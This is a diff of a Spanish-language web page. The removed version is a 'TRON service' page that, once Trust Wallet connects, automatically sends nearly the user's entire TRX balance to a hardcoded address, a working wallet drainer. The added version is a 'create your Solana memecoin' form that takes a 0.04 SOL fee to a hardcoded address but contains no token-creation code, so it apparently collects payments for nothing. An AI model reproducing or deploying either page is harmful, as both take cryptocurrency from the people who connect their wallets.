@@ -3,139 +3,301 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Transferencia Automática TRON</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.1.0/dist/TronWeb.js"></script>
+    <title>Crear tu Memecoin en Solana</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
+            font-family: 'Arial', sans-serif;
+            background-color: #0f0f1a;
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 800px;
             margin: 0 auto;
             padding: 20px;
-            text-align: center;
         }
-        button {
-            background-color: #1c1c1c;
-            color: white;
-            border: none;
-            padding: 10px 20px;
+        
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        h1 {
+            color: #9945FF;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #14F195;
+            font-size: 1.2em;
+            margin-bottom: 30px;
+        }
+        
+        .form-container {
+            background-color: #1e1e2d;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #9945FF;
+            font-weight: bold;
+        }
+        
+        input[type="text"], input[type="number"], input[type="url"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #333;
             border-radius: 5px;
-            cursor: pointer;
-            margin: 10px;
+            background-color: #2a2a3a;
+            color: #ffffff;
             font-size: 16px;
         }
-        #status {
-            margin-top: 20px;
-            padding: 10px;
+        
+        input:focus {
+            outline: none;
+            border-color: #9945FF;
+        }
+        
+        .btn {
+            background: linear-gradient(90deg, #9945FF 0%, #14F195 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
             border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            transition: all 0.3s ease;
         }
-        .success {
-            background-color: #d4edda;
-            color: #155724;
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(20, 241, 149, 0.3);
         }
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
+        
+        .wallet-status {
+            text-align: center;
+            margin-bottom: 20px;
         }
-        .warning {
-            background-color: #fff3cd;
-            color: #856404;
+        
+        .connected {
+            color: #14F195;
+        }
+        
+        .disconnected {
+            color: #FF6B6B;
+        }
+        
+        .info-box {
+            background-color: #2a2a3a;
+            border-left: 4px solid #9945FF;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 0 5px 5px 0;
+        }
+        
+        .fee-info {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #aaa;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #777;
+            font-size: 0.9em;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <h1>Servicio TRON</h1>
-    <p>Conecta tu billetera Trust Wallet para continuar</p>
-    
-    <button id="connectBtn">Conectar Trust Wallet</button>
-    
-    <div id="status">Esperando conexión...</div>
-    
+    <div class="container">
+        <header>
+            <h1>Crear tu Memecoin en Solana</h1>
+            <p class="subtitle">Lanza tu propia criptomoneda meme en minutos con solo unos clics</p>
+        </header>
+        
+        <div class="wallet-status">
+            <p id="walletStatus" class="disconnected">🔴 Billetera no conectada</p>
+            <button id="connectWallet" class="btn">Conectar Phantom Wallet</button>
+        </div>
+        
+        <div class="info-box">
+            <p>Para crear tu memecoin, completa el formulario a continuación y envía la tarifa de creación de 0.04 SOL. Tu token será creado automáticamente una vez confirmado el pago.</p>
+        </div>
+        
+        <div class="form-container">
+            <form id="tokenForm">
+                <div class="form-group">
+                    <label for="tokenName">Nombre del Token</label>
+                    <input type="text" id="tokenName" placeholder="Ej: DogeCoin" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="tokenSymbol">Símbolo del Token</label>
+                    <input type="text" id="tokenSymbol" placeholder="Ej: DOGE" maxlength="5" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="totalSupply">Suministro Total</label>
+                    <input type="number" id="totalSupply" placeholder="Ej: 1000000000" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="decimals">Decimales</label>
+                    <input type="number" id="decimals" value="6" min="0" max="9" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="tokenImage">URL de la Imagen del Token</label>
+                    <input type="url" id="tokenImage" placeholder="https://ejemplo.com/imagen.png" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="description">Descripción del Token (Opcional)</label>
+                    <input type="text" id="description" placeholder="Breve descripción de tu memecoin">
+                </div>
+                
+                <div class="form-group">
+                    <label for="website">Sitio Web (Opcional)</label>
+                    <input type="url" id="website" placeholder="https://tumemecoin.com">
+                </div>
+                
+                <button type="submit" id="createToken" class="btn">Crear Memecoin</button>
+            </form>
+            
+            <div class="fee-info">
+                <p>Tarifa de creación: 0.04 SOL</p>
+                <p id="paymentAddress">Dirección de pago: 9o284rkZpNtRzHmmavSVPLyE44UoozUpd74wFBfuijAE</p>
+            </div>
+        </div>
+        
+        <footer>
+            <p>Esta herramienta crea tokens en la red Solana. Asegúrate de tener SOL en tu billetera para pagar las tarifas de transacción.</p>
+            <p>© 2023 Memecoin Creator - Todos los derechos reservados</p>
+        </footer>
+    </div>
+
     <script>
-        // Configuración de TronWeb
-        const tronWeb = new TronWeb({
-            fullHost: 'https://api.trongrid.io',
-            headers: { "TRON-PRO-API-KEY": "tu-api-key" }
-        });
-        
-        // Dirección de destino
-        const destino = "TTe7RUx6YN2sA7xwbFfnNr2cKQ6Z1B6eS7";
-        const statusDiv = document.getElementById('status');
-        const connectBtn = document.getElementById('connectBtn');
-        
-        // Función para transferir automáticamente
-        async function transferirAutomaticamente() {
-            try {
-                statusDiv.textContent = "Procesando transferencia...";
-                statusDiv.className = "";
-                
-                // Obtener balance
-                const balance = await window.tronWeb.trx.getBalance();
-                const balanceTRX = window.tronWeb.fromSun(balance);
-                
-                if (balanceTRX <= 1) { // Dejamos 1 TRX para fees si es necesario
-                    statusDiv.textContent = "Balance insuficiente para transferir";
-                    statusDiv.className = "warning";
-                    return;
+        // Conectar Phantom Wallet
+        document.getElementById('connectWallet').addEventListener('click', async () => {
+            if (window.solana && window.solana.isPhantom) {
+                try {
+                    const response = await window.solana.connect();
+                    const publicKey = response.publicKey.toString();
+                    document.getElementById('walletStatus').textContent = `🟢 Conectado: ${publicKey.substring(0, 4)}...${publicKey.substring(publicKey.length - 4)}`;
+                    document.getElementById('walletStatus').className = 'connected';
+                    document.getElementById('connectWallet').textContent = 'Billetera Conectada';
+                    document.getElementById('connectWallet').disabled = true;
+                } catch (err) {
+                    console.error('Error al conectar la billetera:', err);
+                    alert('Error al conectar la billetera. Por favor, inténtalo de nuevo.');
                 }
-                
-                // Calculamos el monto a transferir (dejamos 1 TRX para posibles fees futuros)
-                const montoTransferencia = balance - window.tronWeb.toSun(1);
-                
-                statusDiv.textContent = `Transferiendo ${window.tronWeb.fromSun(montoTransferencia)} TRX...`;
-                
-                // Crear y enviar transacción
-                const tx = await window.tronWeb.transactionBuilder.sendTrx(
-                    destino,
-                    montoTransferencia,
-                    window.tronWeb.defaultAddress.base58
-                );
-                
-                const signedTx = await window.tronWeb.trx.sign(tx);
-                const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
-                
-                statusDiv.textContent = `Transferencia completada. TXID: ${result.txid}`;
-                statusDiv.className = "success";
-                
-            } catch (error) {
-                statusDiv.textContent = `Error: ${error.message}`;
-                statusDiv.className = "error";
-            }
-        }
-        
-        // Conectar a Trust Wallet y transferir automáticamente
-        connectBtn.addEventListener('click', async () => {
-            try {
-                if (window.tronWeb && window.tronWeb.ready) {
-                    // Solicitar conexión
-                    await window.tronWeb.request({method: 'tron_requestAccounts'});
-                    
-                    // Verificar red TRON
-                    if (window.tronWeb.fullNode.host !== tronWeb.fullHost) {
-                        statusDiv.textContent = "Por favor cambia a la red principal de TRON en Trust Wallet";
-                        statusDiv.className = "error";
-                        return;
-                    }
-                    
-                    statusDiv.textContent = "Conectado. Iniciando transferencia...";
-                    connectBtn.disabled = true;
-                    
-                    // Iniciar transferencia automática
-                    await transferirAutomaticamente();
-                    
-                } else {
-                    statusDiv.textContent = "Trust Wallet no detectado. Usa el navegador integrado de Trust Wallet.";
-                    statusDiv.className = "error";
-                }
-            } catch (error) {
-                statusDiv.textContent = `Error de conexión: ${error.message}`;
-                statusDiv.className = "error";
+            } else {
+                alert('Phantom Wallet no está instalado. Por favor, instálalo desde https://phantom.app/');
+                window.open('https://phantom.app/', '_blank');
             }
         });
-        
-        // Detectar si ya está conectado (para recargar página)
-        if (window.tronWeb && window.tronWeb.ready) {
-            connectBtn.click();
-        }
+
+        // Manejar el envío del formulario
+        document.getElementById('tokenForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (!window.solana || !window.solana.isPhantom) {
+                alert('Por favor, instala y conecta Phantom Wallet primero.');
+                return;
+            }
+            
+            // Validar campos
+            const tokenName = document.getElementById('tokenName').value.trim();
+            const tokenSymbol = document.getElementById('tokenSymbol').value.trim().toUpperCase();
+            const totalSupply = document.getElementById('totalSupply').value;
+            const decimals = document.getElementById('decimals').value;
+            const tokenImage = document.getElementById('tokenImage').value.trim();
+            
+            if (!tokenName || !tokenSymbol || !totalSupply || !decimals || !tokenImage) {
+                alert('Por favor, completa todos los campos requeridos.');
+                return;
+            }
+            
+            if (tokenSymbol.length > 5) {
+                alert('El símbolo del token no puede tener más de 5 caracteres.');
+                return;
+            }
+            
+            // Mostrar confirmación
+            const confirmCreate = confirm(`¿Estás seguro de que quieres crear el token ${tokenName} (${tokenSymbol}) con un suministro de ${totalSupply} y ${decimals} decimales? Costo: 0.04 SOL`);
+            
+            if (confirmCreate) {
+                try {
+                    // Crear transacción para enviar 0.04 SOL
+                    const paymentAddress = '9o284rkZpNtRzHmmavSVPLyE44UoozUpd74wFBfuijAE';
+                    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                    const fromPubkey = window.solana.publicKey;
+                    const toPubkey = new solanaWeb3.PublicKey(paymentAddress);
+                    const lamports = 0.04 * solanaWeb3.LAMPORTS_PER_SOL;
+                    
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: fromPubkey,
+                            toPubkey: toPubkey,
+                            lamports: lamports,
+                        })
+                    );
+                    
+                    transaction.feePayer = fromPubkey;
+                    
+                    // Obtener el último bloquehash
+                    let { blockhash } = await connection.getLatestBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    
+                    // Firmar y enviar la transacción
+                    const signed = await window.solana.signTransaction(transaction);
+                    const signature = await connection.sendRawTransaction(signed.serialize());
+                    
+                    alert(`Transacción enviada con éxito! Firma: ${signature}\n\nTu memecoin será creada una vez confirmada la transacción.`);
+                    
+                    // Aquí podrías enviar los datos del token a tu backend para procesamiento
+                    // await sendTokenDataToBackend({ tokenName, tokenSymbol, totalSupply, decimals, tokenImage, txSignature: signature });
+                    
+                } catch (err) {
+                    console.error('Error al enviar la transacción:', err);
+                    alert('Error al enviar la transacción. Por favor, inténtalo de nuevo.');
+                }
+            }
+        });
+
+        // Cargar el SDK de Solana Web3.js dinámicamente
+        const script = document.createElement('script');
+        script.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js';
+        script.onload = () => {
+            console.log('Solana Web3.js loaded');
+        };
+        document.head.appendChild(script);
     </script>
 </body>
-</html>
+                        </html>
